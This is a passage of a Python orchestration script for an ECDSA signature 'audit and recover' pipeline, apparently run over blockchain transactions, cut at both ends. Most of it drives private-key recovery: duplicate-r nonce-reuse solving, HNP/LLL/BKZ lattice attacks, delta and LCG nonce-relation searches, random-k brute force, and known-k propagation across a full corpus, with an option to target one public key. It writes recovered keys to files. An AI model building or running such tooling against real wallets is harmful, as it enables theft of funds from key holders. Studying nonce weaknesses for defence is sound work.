                    help="Max full-corpus signature rows to scan for known-k propagation (0 = no cap)")
    ap.add_argument("--known-k-full-corpus-index-db", default="",
                    help="Optional existing SQLite index path for full-corpus known-k extraction")
    ap.add_argument("--known-k-full-corpus-index-report", default="known_k_full_corpus_index_report.json",
                    help="Metadata report for the full-corpus known-k SQLite index/extract path")
    ap.add_argument("--build-known-k-full-corpus-index", action="store_true",
                    help="Build/update --known-k-full-corpus-index-db inside recovery; default reuses an existing index or falls back to streaming")
    ap.add_argument("--recovery-graph-subset-out", default="signatures.recovery_graph_focus.jsonl",
                    help="Rows connected to recovered pubkeys or recovered r->k facts for cheap chain extraction")
    ap.add_argument("--recovery-graph-report", default="recovery_graph_report.json",
                    help="Metadata-only report for recovered fact graph focus selection")
    ap.add_argument("--recovery-graph-expansion-report", default="recovery_graph_expansion_report.json",
                    help="Metadata-only report explaining whether graph-connected rows expanded recovery")
    ap.add_argument("--unresolved-targets-out", default="signatures.unresolved_targets.jsonl",
                    help="Rows with duplicate-r evidence not already explained by recovered pubkeys or recovered r->k facts")
    ap.add_argument("--unresolved-targets-report", default="unresolved_recovery_targets.json",
                    help="Metadata-only report for unresolved recovery target selection")
    ap.add_argument("--enable-unresolved-targets", action="store_true", default=True,
                    help="Use unresolved target filtering to focus expensive relation/fallback stages (default: enabled)")
    ap.add_argument("--no-enable-unresolved-targets", action="store_false", dest="enable_unresolved_targets",
                    help="Disable unresolved target filtering")
    ap.add_argument("--skip-broad-relation-when-resolved", action="store_true", default=True,
                    help="Skip expensive broad relation/fallback scans when unresolved targets, HNP leaks, and candidates are absent")
    ap.add_argument("--no-skip-broad-relation-when-resolved", action="store_false", dest="skip_broad_relation_when_resolved",
                    help="Run broad relation/fallback scans even when no unresolved target evidence remains")
    ap.add_argument("--enable-suspicious-signer-relation", action="store_true", default=True,
                    help="When duplicate-r is resolved, still run a bounded relation scan on audit-flagged signer cohorts")
    ap.add_argument("--no-enable-suspicious-signer-relation", action="store_false", dest="enable_suspicious_signer_relation",
                    help="Disable the bounded audit-flagged signer relation fallback")
    ap.add_argument("--disable-cluster-gating", action="store_true",
                    help="Recover on full signature file (legacy behavior)")
    ap.add_argument("--enable-advanced-recover", action="store_true", default=True,
                    help="Enable multi-stage advanced recovery escalation (default: enabled)")
    ap.add_argument("--no-enable-advanced-recover", action="store_false", dest="enable_advanced_recover",
                    help="Disable advanced recovery escalation")
    ap.add_argument("--random-k-budget", type=int, default=0,
                    help="Random-k tries per bucket for final escalation stage (0 disables random-k stage)")
    ap.add_argument("--delta-max", type=int, default=4096,
                    help="Maximum absolute delta tested for k2 = k1 +/- delta relation")
    ap.add_argument("--delta-per-pair-cap", type=int, default=4096,
                    help="Per-pair cap for delta-gradient relation testing")
    ap.add_argument("--lcg-a-max", type=int, default=4,
                    help="Affine nonce recurrence bound: test |a-1| <= this value")
    ap.add_argument("--lcg-b-max", type=int, default=4096,
                    help="Affine nonce recurrence bound: test |b| <= this value")
    ap.add_argument("--lcg-per-pair-cap", type=int, default=2048,
                    help="Per-pair cap for affine-LCG relation testing")
    ap.add_argument("--hnp-timeout-sec", type=int, default=120,
                    help="Timeout in seconds for HNP/LLL/BKZ solver subprocess")
    ap.add_argument("--hnp-min-leaks", type=int, default=8,
                    help="Minimum rows with explicit known_nonce_bits required to run HNP solver")
    ap.add_argument("--hnp-bits-known", type=int, default=6,
                    help="Known nonce bits used for explicit HNP leak rows")
    ap.add_argument("--hnp-leakage-model", choices=("LSB",), default="LSB",
                    help="Explicit nonce leakage model for HNP rows; only LSB is currently validation-safe")
    ap.add_argument("--hnp-bruteforce-unknown-bits", type=int, default=18,
                    help="Generate exact k candidates only if explicit leak leaves <= this many unknown bits")
    ap.add_argument("--hnp-bruteforce-max-candidates", type=int, default=200000,
                    help="Global cap for exact explicit-leak k candidates")
    ap.add_argument("--hnp-report-out", default="hnp_lll_bkz_report.json",
                    help="Metadata-only HNP gating/solver diagnostics report")
    ap.add_argument("--max-invalid-ratio", type=float, default=0.35,
                    help="If verification invalid_ratio exceeds this (and enough verifiable rows), treat dataset as low-quality")
    ap.add_argument("--min-verifiable-for-gate", type=int, default=200,
                    help="Minimum verifiable signatures before invalid-ratio quality gate is enforced")
    ap.add_argument("--fusion-min-confidence", type=float, default=0.45,
                    help="Minimum signal_fusion confidence to allow recovery without hard signal")
    ap.add_argument("--full-scan-fallback", action="store_true", default=True,
                    help="If filtered recovery yields no new valid rows, automatically retry on the full signature file")
    ap.add_argument("--no-full-scan-fallback", action="store_false", dest="full_scan_fallback",
                    help="Disable automatic retry on the full signature file")
    ap.add_argument("--fallback-max-iter", type=int, default=3,
                    help="max-iter used by the automatic full-input fallback pass")
    ap.add_argument("--fallback-random-k-budget", type=int, default=4096,
                    help="Random-k budget for the automatic full-input fallback pass")
    ap.add_argument("--auto-tune", action="store_true", default=True,
                    help="Auto-tune resource-sensitive parameters from machine CPU/RAM (default: enabled)")
    ap.add_argument("--no-auto-tune", action="store_false", dest="auto_tune",
                    help="Disable machine-aware auto-tuning")

    args = ap.parse_args()

    sigs = Path(args.sigs)
    if not sigs.exists():
        raise FileNotFoundError(f"Missing signatures file: {sigs}")
    for out_path in (
        args.audit_report,
        args.decision_out,
        args.clustered_sigs_out,
        args.cluster_report,
        args.recover_json_out,
        args.recover_txt_out,
        args.recover_k_out,
        args.recover_deltas_out,
        args.recover_collisions_out,
        args.recover_clusters_out,
        args.hnp_candidates_out,
        args.hnp_report_out,
        args.candidate_validation_report,
        args.nonce_hypothesis_out,
        args.nonce_hypothesis_report,
        args.combined_preload_k_out,
        args.target_sigs_out,
        args.sqlite_index_db,
        args.sqlite_index_build_report,
        args.sqlite_index_report,
        args.stage0_subset_out,
        args.stage0_recoverable_out,
        args.stage0_replay_out,
        args.stage0_classification_report,
        args.duplicate_r_pair_report,
        args.strong_signal_out,
        args.relation_neighborhood_out,
        args.relation_neighborhood_report,
        args.recovery_graph_subset_out,
        args.recovery_graph_report,
        args.recovery_graph_expansion_report,
        args.unresolved_targets_out,
        args.unresolved_targets_report,
        args.baseline_report,
    ):
        Path(out_path).parent.mkdir(parents=True, exist_ok=True)

    sqlite_index_report: dict[str, Any] = {"enabled": bool(args.enable_sqlite_index), "available": False}
    if args.enable_sqlite_index and not args.dry_run:
        sqlite_index_report = build_or_use_signature_index(
            sig_path=sigs,
            db_path=Path(args.sqlite_index_db),
            build_report_path=Path(args.sqlite_index_build_report),
            summary_report_path=Path(args.sqlite_index_report),
            store_raw=bool(args.sqlite_index_store_raw),
        )
        if sqlite_index_report.get("available"):
            print(
                "SQLite signature index:",
                f"rows={sqlite_index_report.get('total_index_rows', 0)}",
                f"dup_r={sqlite_index_report.get('duplicate_r_groups', 0)}",
                f"recoverable_dup_r={sqlite_index_report.get('recoverable_same_pub_groups', 0)}",
                f"db={args.sqlite_index_db}",
            )
        else:
            print(f"[warn] SQLite signature index unavailable: {sqlite_index_report.get('error', 'unknown')}")

    target_filter_info: dict[str, Any] = {"enabled": False}
    original_sigs = sigs
    if args.target_pubkey:
        if args.enable_sqlite_index and sqlite_index_report.get("available"):
            try:
                target_filter_info = build_target_pubkey_subset_indexed(
                    db_path=Path(args.sqlite_index_db),
                    target_pubkey=args.target_pubkey,
                    out_path=Path(args.target_sigs_out),
                )
            except Exception as e:
                print(f"[warn] indexed target-pubkey extraction failed; falling back to JSONL scan: {e}")
                target_filter_info = build_target_pubkey_subset(sigs, args.target_pubkey, Path(args.target_sigs_out))
        else:
            target_filter_info = build_target_pubkey_subset(sigs, args.target_pubkey, Path(args.target_sigs_out))
        sigs = Path(args.target_sigs_out)
        print(
            "Target pubkey filter:",
            f"matched={target_filter_info.get('matched_rows', 0)}",
            f"unique_tx_inputs={target_filter_info.get('unique_tx_inputs', 0)}",
            f"output={sigs}",
        )

    sig_rows = count_nonempty_lines(sigs)
    if sig_rows == 0:
        print("No signatures available yet; skipping audit/recover for this cycle.")
        write_decision(args.decision_out, {
            "should_recover": False,
            "recover_executed": False,
            "search_attempted": False,
            "sqlite_index": sqlite_index_report,
            "target_filter": target_filter_info,
            "source_sigs": str(original_sigs),
            "recover_input": None,
        })
        return

    if args.auto_tune:
        auto_tune_params(args, sys.argv[1:], sig_rows)

    py_exec = resolve_python_executable()
    print(f"[python] using interpreter: {py_exec}")

    audit_cmd = [
        py_exec,
        "ecdsa_signature_audit.py",
        str(sigs),
        "--out",
        args.audit_report,
        "--cluster-min-size",
        str(args.audit_cluster_min_size),
        "--baseline-report",
        args.baseline_report,
    ]
    if args.audit_verify_signatures:
        audit_cmd.append("--verify-signatures")
    if args.dry_run:
        print("DRY RUN:", " ".join(shlex.quote(x) for x in audit_cmd))
        return

    if run_cmd(audit_cmd) != 0:
        raise RuntimeError("Audit step failed")

    with open(args.audit_report, "r", encoding="utf-8") as f:
        report = json.load(f)

    risk = int(report.get("risk", {}).get("score", 0))
    verdict = report.get("risk", {}).get("verdict", "unknown")
    dup_r = int(report.get("duplicates_r", {}).get("duplicate_count", 0))
    cross_pub_dup_r = int(report.get("cross_pub_duplicate_r", {}).get("collision_count", 0))
    drift_flags = int(report.get("height_time_drift", {}).get("drift_flags", 0))
    signer_drift_flagged = int(report.get("signer_longitudinal_drift", {}).get("signer_count_flagged", 0))
    sighash_segments = report.get("sighash_segments", {}).get("segments", [])
    sighash_anomaly = any((int(s.get("duplicate_r", 0)) > 0 or int(s.get("fdr_bits_r", 0)) > 0) for s in sighash_segments)
    fusion = report.get("signal_fusion", {}) or {}
    fusion_conf = float(fusion.get("confidence", 0.0) or 0.0)
    fusion_tier = str(fusion.get("tier", "low") or "low")
    fusion_reco = str(fusion.get("recommendation", "monitor_only") or "monitor_only")
    vq = verification_quality(report)
    known_nonce_rows_all = count_known_nonce_rows(sigs)
    external_candidate_requested = bool(
        args.preload_k_candidates
        or args.preload_priv_candidates
        or args.enable_nonce_hypotheses
        or known_nonce_rows_all >= int(args.hnp_min_leaks)
    )
    low_quality_data = (
        vq["enabled"]
        and vq["coincurve_available"]
        and vq["verifiable"] >= args.min_verifiable_for_gate
        and int(vq.get("dropped", 0) or 0) > 0
        and vq["invalid_ratio"] > args.max_invalid_ratio
    )

    print(f"Audit risk score: {risk} ({verdict})")
    print(f"Duplicate-r groups: {dup_r}")
    print(f"Cross-pub duplicate-r groups: {cross_pub_dup_r}")
    print(f"Height/time drift flags: {drift_flags}")
    print(f"Signal fusion: tier={fusion_tier} conf={fusion_conf:.3f} recommendation={fusion_reco}")
    print(
        "Verification quality:",
        f"verifiable={vq['verifiable']}",
        f"invalid={vq['invalid']}",
        f"invalid_ratio={vq['invalid_ratio']:.4f}",
    )

    should_recover = (
        args.force_recover
        or args.exhaustive_recover
        or external_candidate_requested
        or risk >= args.risk_threshold
        or fusion_conf >= args.fusion_min_confidence
        or dup_r > 0
        or cross_pub_dup_r > 0
        or drift_flags > 0
        or sighash_anomaly
    )
    hard_signal = (
        dup_r > 0
        or cross_pub_dup_r > 0
        or drift_flags > 0
        or signer_drift_flagged > 0
        or sighash_anomaly
    )
    if low_quality_data and not (hard_signal or args.force_recover or args.exhaustive_recover or external_candidate_requested):
        should_recover = False

    cluster_fallback_used = False

    if not should_recover:
        print("Recovery skipped by policy (low anomaly signal).")
        write_decision(args.decision_out, {
            "should_recover": False,
            "recover_executed": False,
            "risk_score": risk,
            "risk_verdict": verdict,
            "duplicate_r": dup_r,
            "cross_pub_duplicate_r": cross_pub_dup_r,
            "drift_flags": drift_flags,
            "sighash_anomaly": sighash_anomaly,
            "signal_fusion_tier": fusion_tier,
            "signal_fusion_confidence": fusion_conf,
            "signal_fusion_recommendation": fusion_reco,
            "verification_quality": vq,
            "low_quality_data": low_quality_data,
            "cluster_fallback_used": cluster_fallback_used,
            "sqlite_index": sqlite_index_report,
            "target_filter": target_filter_info,
            "source_sigs": str(original_sigs),
            "recover_input": None,
            "cluster_gating_used": not args.disable_cluster_gating,
        })
        try:
            Path(args.baseline_report).write_text(Path(args.audit_report).read_text(encoding="utf-8"), encoding="utf-8")
        except Exception:
            pass
        return

    recover_input = str(sigs)
    allow_advanced = args.enable_advanced_recover
    if fusion_reco == "monitor_only" and not (
        hard_signal or args.force_recover or args.exhaustive_recover or external_candidate_requested
    ):
        print("Fusion recommendation is monitor_only; recovery skipped.")
        write_decision(args.decision_out, {
            "should_recover": False,
            "recover_executed": False,
            "risk_score": risk,
            "risk_verdict": verdict,
            "duplicate_r": dup_r,
            "cross_pub_duplicate_r": cross_pub_dup_r,
            "drift_flags": drift_flags,
            "sighash_anomaly": sighash_anomaly,
            "signal_fusion_tier": fusion_tier,
            "signal_fusion_confidence": fusion_conf,
            "signal_fusion_recommendation": fusion_reco,
            "verification_quality": vq,
            "low_quality_data": low_quality_data,
            "cluster_fallback_used": cluster_fallback_used,
            "sqlite_index": sqlite_index_report,
            "target_filter": target_filter_info,
            "source_sigs": str(original_sigs),
            "recover_input": None,
            "cluster_gating_used": not args.disable_cluster_gating,
        })
        return
    if fusion_reco == "run_clustered_recovery" and not args.exhaustive_recover:
        allow_advanced = False

    effective_cluster_threshold = args.cluster_risk_threshold
    if low_quality_data:
        # Defensive: require stronger per-cluster signal when verification quality is poor.
        effective_cluster_threshold += 15
    if fusion_tier == "high":
        effective_cluster_threshold = max(5, effective_cluster_threshold - 5)
    elif fusion_tier == "critical":
        effective_cluster_threshold = max(0, effective_cluster_threshold - 10)
    # Stage0 is built from the full input before any cluster filtering.
    stage0_subset_info = None
    duplicate_r_pair_report: dict[str, Any] = {}
    duplicate_r_pair_summary: dict[str, Any] = {}
    stage0_path = Path(args.stage0_subset_out)
    stage0_recoverable_path = Path(args.stage0_recoverable_out)
    stage0_replay_path = Path(args.stage0_replay_out)
    if dup_r > 0:
        if args.enable_sqlite_index and sqlite_index_report.get("available") and not args.target_pubkey:
            try:
                stage0_subset_info = build_duplicate_r_focus_subset_indexed(
                    db_path=Path(args.sqlite_index_db),
                    out_path=stage0_path,
                    recoverable_out_path=stage0_recoverable_path,
                    replay_out_path=stage0_replay_path,
                    report_path=Path(args.stage0_classification_report),
                )
            except Exception as e:
                print(f"[warn] indexed duplicate-r extraction failed; falling back to JSONL scan: {e}")
                stage0_subset_info = build_duplicate_r_focus_subset(
                    sig_path=sigs,
                    out_path=stage0_path,
                    recoverable_out_path=stage0_recoverable_path,
                    replay_out_path=stage0_replay_path,
                    report_path=Path(args.stage0_classification_report),
                )
        else:
            stage0_subset_info = build_duplicate_r_focus_subset(
                sig_path=sigs,
                out_path=stage0_path,
                recoverable_out_path=stage0_recoverable_path,
                replay_out_path=stage0_replay_path,
                report_path=Path(args.stage0_classification_report),
            )

    if not args.disable_cluster_gating:
        cluster_report = build_cluster_subset(
            sig_path=sigs,
            min_sigs=args.cluster_min_sigs,
            cluster_risk_threshold=effective_cluster_threshold,
            max_clusters=args.max_clusters,
            out_path=Path(args.clustered_sigs_out),
            report_path=Path(args.cluster_report),
            audit_report=report,
        )
        print(
            "Cluster gating:",
            f"analyzed={cluster_report['analyzed_clusters']}",
            f"flagged={cluster_report['flagged_clusters']}",
            f"selected_signatures={cluster_report['selected_signatures']}",
        )
        if cluster_report["selected_signatures"] == 0 and not args.force_recover:
            strong_no_cluster_signal = (
                args.exhaustive_recover
                or fusion_tier in {"high", "critical"}
                or risk >= args.risk_threshold + 20
                or dup_r > 0
                or cross_pub_dup_r > 0
                or drift_flags > 0
                or sighash_anomaly
                or external_candidate_requested
            )
            if strong_no_cluster_signal:
                cluster_fallback_used = True
                recover_input = str(sigs)
                print("No suspicious clusters selected, but strong signal is present; falling back to full-input recovery.")
            else:
                print("No suspicious clusters selected; recovery skipped.")
                write_decision(args.decision_out, {
                    "should_recover": True,
                    "recover_executed": False,
                    "risk_score": risk,
                    "risk_verdict": verdict,
                    "duplicate_r": dup_r,
                    "cross_pub_duplicate_r": cross_pub_dup_r,
                    "drift_flags": drift_flags,
                    "sighash_anomaly": sighash_anomaly,
                    "signal_fusion_tier": fusion_tier,
                    "signal_fusion_confidence": fusion_conf,
                    "signal_fusion_recommendation": fusion_reco,
                    "verification_quality": vq,
                    "low_quality_data": low_quality_data,
                    "cluster_fallback_used": cluster_fallback_used,
                    "sqlite_index": sqlite_index_report,
                    "target_filter": target_filter_info,
                    "source_sigs": str(original_sigs),
                    "recover_input": None,
                    "cluster_gating_used": not args.disable_cluster_gating,
                    "effective_cluster_risk_threshold": effective_cluster_threshold,
                    "cluster_report": cluster_report,
                    "duplicate_r_pair_diagnostics": duplicate_r_pair_summary,
                })
                return
        if cluster_report["selected_signatures"] > 0:
            recover_input = args.clustered_sigs_out

    # Stage0 duplicate-r focus should not blindly override broader cluster-selected input.
    # Only use it as primary recover input when there is nontrivial duplicate-r structure.
    if stage0_subset_info and stage0_subset_info.get("selected_signatures", 0) > 0:
        print(
            "Stage0 duplicate-r focus:",
            f"groups={stage0_subset_info.get('duplicate_r_groups', 0)}",
            f"nontrivial={stage0_subset_info.get('nontrivial_duplicate_r_groups', 0)}",
            f"same_r_diff_s={stage0_subset_info.get('same_r_diff_s_groups', 0)}",
            f"cross_pub={stage0_subset_info.get('cross_pub_duplicate_r_groups', 0)}",
            f"selected={stage0_subset_info.get('selected_signatures', 0)}",
            f"recoverable_focus={stage0_subset_info.get('selected_signatures_recoverable_focus', 0)}",
            f"replay_like={stage0_subset_info.get('selected_signatures_replay_like', 0)}",
        )
        if int(stage0_subset_info.get("nontrivial_duplicate_r_groups", 0)) > 0:
            print("Stage0 has nontrivial duplicate-r; running dedicated recovery on recoverable-focus rows.")
        else:
            print("Stage0 is replay-like only; keeping broader recover_input for stage1.")

        pair_diag_input = stage0_recoverable_path if stage0_recoverable_path.exists() else stage0_path
        duplicate_r_pair_report = build_duplicate_r_pair_diagnostics(
            sig_path=pair_diag_input,
            out_path=Path(args.duplicate_r_pair_report),
        )
        duplicate_r_pair_summary = summarize_duplicate_r_pair_diagnostics(duplicate_r_pair_report)
        print(
            "Duplicate-r pair diagnostics:",
            f"direct_valid_pairs={duplicate_r_pair_report.get('direct_valid_pairs', 0)}",
            f"cross_pub_pairs={duplicate_r_pair_report.get('cross_pub_pairs', 0)}",
            f"report={args.duplicate_r_pair_report}",
        )

    hnp_leak_report = build_explicit_hnp_leak_subset(
        sig_path=sigs,
        out_path=Path(args.hnp_leaks_out),
        report_path=Path(args.hnp_leak_report),
        bits_known=args.hnp_bits_known,
        leakage_model=args.hnp_leakage_model,
    )
    hnp_bounded_k_report = generate_explicit_leak_k_candidates(
        leak_path=Path(args.hnp_leaks_out),
        out_path=Path(args.hnp_bounded_k_out),
        report_path=Path(args.hnp_bounded_k_report),
        bits_known=args.hnp_bits_known,
        leakage_model=args.hnp_leakage_model,
        max_unknown_bits=args.hnp_bruteforce_unknown_bits,
        max_total_candidates=args.hnp_bruteforce_max_candidates,
    )

    # Always attempt HNP/LLL/BKZ when recovery is enabled, but only on
    # normalized explicit leak rows. HNP is not run on inferred anomalies.
    hnp_input = args.hnp_leaks_out
    if stage0_subset_info and stage0_subset_info.get("duplicate_r_groups", 0) > 0:
        if int(stage0_subset_info.get("nontrivial_duplicate_r_groups", 0)) == 0:
            print("Duplicate-r groups are replay-like only (no same-r/diff-s); continuing with HNP + staged recovery.")
        else:
            print("[HNP/LLL/BKZ] Checking explicit nonce-leak subset alongside nontrivial duplicate-r evidence...")
    else:
        print("[HNP/LLL/BKZ] Checking explicit nonce-leak subset...")
    hnp_candidates = try_hnp_lll_bkz_solver(
        hnp_input,
        bits_known=args.hnp_bits_known,
        q=None,
        out_path=args.hnp_candidates_out,
        report_path=args.hnp_report_out,
        timeout_sec=args.hnp_timeout_sec,
        min_leaks=args.hnp_min_leaks,
    )
    nonce_hypothesis_input, nonce_hypothesis_input_reason = choose_nonce_hypothesis_input(
        hnp_leaks_path=Path(args.hnp_leaks_out),
        stage0_recoverable_path=stage0_recoverable_path,
        stage0_path=stage0_path,
        active_sigs_path=sigs,
    )
    nonce_hypothesis_report = run_nonce_hypothesis_generator(args, str(nonce_hypothesis_input))
    if nonce_hypothesis_report.get("enabled"):
        nonce_hypothesis_report["selected_input"] = str(nonce_hypothesis_input)
        nonce_hypothesis_report["selected_input_reason"] = nonce_hypothesis_input_reason
        nonce_hypothesis_report["selected_input_rows"] = count_nonempty_lines(nonce_hypothesis_input)
        try:
            Path(args.nonce_hypothesis_report).write_text(
                json.dumps(nonce_hypothesis_report, indent=2, sort_keys=True),
                encoding="utf-8",
            )
        except Exception as e:
            nonce_hypothesis_report["selected_input_report_write_error"] = str(e)
    preload_k_paths = []
    if args.preload_k_candidates:
        preload_k_paths.append(Path(args.preload_k_candidates))
    if int(hnp_bounded_k_report.get("total_candidates", 0) or 0) > 0:
        preload_k_paths.append(Path(args.hnp_bounded_k_out))
    if nonce_hypothesis_report.get("enabled"):
        preload_k_paths.append(Path(args.nonce_hypothesis_out))
    merged_preload_k = merge_preload_k_files(preload_k_paths, Path(args.combined_preload_k_out))
    if merged_preload_k is not None:
        args.preload_k_candidates = str(merged_preload_k)
    external_candidate_args, external_candidate_report = build_external_candidate_args(args)
    if nonce_hypothesis_report.get("enabled"):
        external_candidate_report["nonce_hypotheses"] = nonce_hypothesis_report
    candidate_evidence_available = bool(
        external_candidate_report.get("enabled")
        or (hnp_candidates and len(hnp_candidates) > 0)
        or int(nonce_hypothesis_report.get("matched_candidates", 0) or 0) > 0
    )
    explicit_preload_k_evidence = bool(
        args.preload_k_candidates
        and not is_local_recovery_store_path(str(args.preload_k_candidates), kind="k")
    )
    explicit_preload_priv_evidence = bool(
        args.preload_priv_candidates
        and not is_local_recovery_store_path(str(args.preload_priv_candidates), kind="keys")
    )
    broad_relation_candidate_evidence_available = bool(
        explicit_preload_k_evidence
        or explicit_preload_priv_evidence
        or (hnp_candidates and len(hnp_candidates) > 0)
        or int(hnp_bounded_k_report.get("total_candidates", 0) or 0) > 0
        or int(nonce_hypothesis_report.get("matched_candidates", 0) or 0) > 0
    )

    # Multi-stage recovery:
    # stage1: primary/cheap scan (disable LCG + no random-k)
    # stage2: enable LCG/delta if anomaly signal is strong
    # stage3: optional random-k budget, only on strongest signals
    stage_runs = []
    pre_recover_validation = post_validate_recovered(Path(args.recover_json_out))
    post_validation = pre_recover_validation
    known_k_chain_report: dict[str, Any] | None = None
    known_k_chain_history: list[dict[str, Any]] = []
    known_priv_chain_report: dict[str, Any] | None = None
    known_priv_chain_history: list[dict[str, Any]] = []
    unresolved_targets_report: dict[str, Any] | None = None
    def artifact_fingerprint(path: Path) -> str:
        if not path.exists():
            return "missing"
        h = hashlib.sha256()
        with path.open("rb") as f:
            for chunk in iter(lambda: f.read(1024 * 1024), b""):
                h.update(chunk)
        return h.hexdigest()

    last_known_k_fingerprint = artifact_fingerprint(Path(args.recover_k_out))
    last_known_k_rows = count_nonempty_lines(Path(args.recover_k_out))
    last_known_priv_fingerprint = artifact_fingerprint(Path(args.recover_json_out))
    last_known_priv_rows = count_nonempty_lines(Path(args.recover_json_out))

    def maybe_run_known_k_chain(trigger_stage: str) -> dict[str, Any] | None:
        nonlocal known_k_chain_report, last_known_k_fingerprint, last_known_k_rows, post_validation
        if not args.enable_chain_extraction:
            return known_k_chain_report
        before_k_rows = last_known_k_rows
        current_k_rows = count_nonempty_lines(Path(args.recover_k_out))
        current_fingerprint = artifact_fingerprint(Path(args.recover_k_out))
        if current_fingerprint == last_known_k_fingerprint:
            return known_k_chain_report
        previous_fingerprint = last_known_k_fingerprint
        last_known_k_fingerprint = current_fingerprint
        last_known_k_rows = current_k_rows
        known_k_chain_report = derive_recovered_keys_from_known_k(
            sig_path=sigs,
            recovered_k_path=Path(args.recover_k_out),
            recovered_json_path=Path(args.recover_json_out),
            recovered_txt_path=Path(args.recover_txt_out),
            report_path=Path(args.known_k_chain_report),
            max_rows=max(0, int(args.known_k_chain_max_rows)),
        )
        accepted = int(known_k_chain_report.get("accepted_new_keys", 0) or 0)
        full_corpus_report: dict[str, Any] | None = None
        full_corpus_path = Path(args.known_k_full_corpus_sigs) if args.known_k_full_corpus_sigs else None
        if full_corpus_path and full_corpus_path.exists():
            try:
                if full_corpus_path.resolve() != sigs.resolve():
                    full_corpus_input = full_corpus_path
                    full_corpus_mode = "streaming_full_corpus"
                    index_report: dict[str, Any] | None = None
                    extract_report: dict[str, Any] | None = None
                    if args.enable_sqlite_index and args.known_k_full_corpus_index_db:
                        try:
                            from signature_sqlite_index import db_report, extract_known_r

                            index_db = Path(args.known_k_full_corpus_index_db)
                            if args.build_known_k_full_corpus_index:
                                index_report = build_or_use_signature_index(
                                    sig_path=full_corpus_path,
                                    db_path=index_db,
                                    build_report_path=Path(args.known_k_full_corpus_index_report).with_name(
                                        Path(args.known_k_full_corpus_index_report).stem + "_build.json"
                                    ),
                                    summary_report_path=Path(args.known_k_full_corpus_index_report),
                                    store_raw=bool(args.sqlite_index_store_raw),
                                )
                            elif index_db.exists():
                                summary = db_report(index_db)
                                index_report = {
                                    "enabled": True,
                                    "available": True,
                                    "reused_existing": True,
                                    "db": str(index_db),
                                    "input": str(full_corpus_path),
                                    "total_index_rows": summary.get("total_rows", 0),
                                    "duplicate_r_groups": summary.get("duplicate_r_groups", 0),
                                    "recoverable_same_pub_groups": summary.get("recoverable_same_pub_groups", 0),
                                    "cross_pub_duplicate_r_groups": summary.get("cross_pub_duplicate_r_groups", 0),
                                }
                                Path(args.known_k_full_corpus_index_report).parent.mkdir(parents=True, exist_ok=True)
                                Path(args.known_k_full_corpus_index_report).write_text(
                                    json.dumps(index_report, indent=2, sort_keys=True),
                                    encoding="utf-8",
                                )
                            else:
                                index_report = {
                                    "enabled": True,
                                    "available": False,
                                    "reason": "index_missing_build_disabled",
                                    "db": str(index_db),
                                }
                            if index_report.get("available"):
                                extract_report = extract_known_r(
                                    db_path=index_db,
                                    recovered_k_path=Path(args.recover_k_out),
                                    out_path=Path(args.known_k_full_corpus_out),
                                )
                                full_corpus_input = Path(args.known_k_full_corpus_out)
                                full_corpus_mode = "sqlite_known_r_extract"
                        except Exception as e:
                            index_report = {"available": False, "error": str(e)}
                            print(f"[warn] indexed full-corpus known-r extraction failed; falling back to stream: {e}")
                    full_corpus_report = derive_recovered_keys_from_known_k(
                        sig_path=full_corpus_input,
                        recovered_k_path=Path(args.recover_k_out),
                        recovered_json_path=Path(args.recover_json_out),
                        recovered_txt_path=Path(args.recover_txt_out),
                        report_path=Path(args.known_k_full_corpus_report),
                        max_rows=max(0, int(args.known_k_full_corpus_max_rows)),
                        known_r_rows_path=(
                            None
                            if full_corpus_mode == "sqlite_known_r_extract"
                            else Path(args.known_k_full_corpus_out)
                        ),
                    )
                    known_k_chain_report["full_corpus"] = {
                        "enabled": True,
                        "input": str(full_corpus_path),
                        "mode": full_corpus_mode,
                        "report": str(args.known_k_full_corpus_report),
                        "known_r_rows_output": str(args.known_k_full_corpus_out),
                        "accepted_new_keys": int(full_corpus_report.get("accepted_new_keys", 0) or 0),
                        "rows_with_known_r": int(full_corpus_report.get("rows_with_known_r", 0) or 0),
                        "known_r_rows_written": (
                            int(extract_report.get("written_rows", 0) or 0)
                            if extract_report is not None
                            else int(full_corpus_report.get("known_r_rows_written", 0) or 0)
                        ),
                    }
                    if index_report is not None:
                        known_k_chain_report["full_corpus"]["index"] = index_report
                    if extract_report is not None:
                        known_k_chain_report["full_corpus"]["extract"] = extract_report
                    accepted += int(full_corpus_report.get("accepted_new_keys", 0) or 0)
                else:
                    known_k_chain_report["full_corpus"] = {
                        "enabled": False,
                        "reason": "same_as_active_input",
                        "input": str(full_corpus_path),
                    }
            except Exception as e:
                known_k_chain_report["full_corpus"] = {
                    "enabled": True,
                    "error": str(e),
                    "input": str(full_corpus_path),
                }
                print(f"[warn] full-corpus known-k propagation failed: {e}")
        elif args.known_k_full_corpus_sigs:
            known_k_chain_report["full_corpus"] = {
                "enabled": False,
                "reason": "input_missing",
                "input": str(args.known_k_full_corpus_sigs),
            }
        run_summary = {
            "name": "known-k-chain",
            "trigger": trigger_stage,
            "rc": 0,
            "recovered_k_rows_before": before_k_rows,
            "recovered_k_rows_after": current_k_rows,
            "recovered_k_changed": True,
            "previous_recovered_k_fingerprint": previous_fingerprint[:16],
            "current_recovered_k_fingerprint": current_fingerprint[:16],
            "accepted_new_keys": accepted,
            "active_input_accepted_new_keys": int(known_k_chain_report.get("accepted_new_keys", 0) or 0),
            "rows_with_known_r": int(known_k_chain_report.get("rows_with_known_r", 0) or 0),
            "full_corpus_accepted_new_keys": (
                int(full_corpus_report.get("accepted_new_keys", 0) or 0)
                if full_corpus_report else 0
            ),
            "full_corpus_rows_with_known_r": (
                int(full_corpus_report.get("rows_with_known_r", 0) or 0)
                if full_corpus_report else 0
            ),
        }
        known_k_chain_history.append(run_summary)
        known_k_chain_report["trigger"] = trigger_stage
        known_k_chain_report["history"] = known_k_chain_history
        known_k_chain_report["cumulative_accepted_new_keys"] = sum(
            int(x.get("accepted_new_keys", 0) or 0) for x in known_k_chain_history
        )
        known_k_chain_report["cumulative_full_corpus_accepted_new_keys"] = sum(
            int(x.get("full_corpus_accepted_new_keys", 0) or 0) for x in known_k_chain_history
        )
        known_k_chain_report["cumulative_rows_with_known_r"] = sum(
            int(x.get("rows_with_known_r", 0) or 0) for x in known_k_chain_history
        )
        Path(args.known_k_chain_report).write_text(json.dumps(known_k_chain_report, indent=2), encoding="utf-8")
        stage_runs.append(run_summary)
        print(
            "Known-k chain propagation:",
            f"trigger={trigger_stage}",
            f"accepted_new_keys={accepted}",
            f"rows_with_known_r={known_k_chain_report.get('rows_with_known_r', 0)}",
            f"full_corpus_rows_with_known_r={full_corpus_report.get('rows_with_known_r', 0) if full_corpus_report else 0}",
            f"report={args.known_k_chain_report}",
        )
        if accepted > 0:
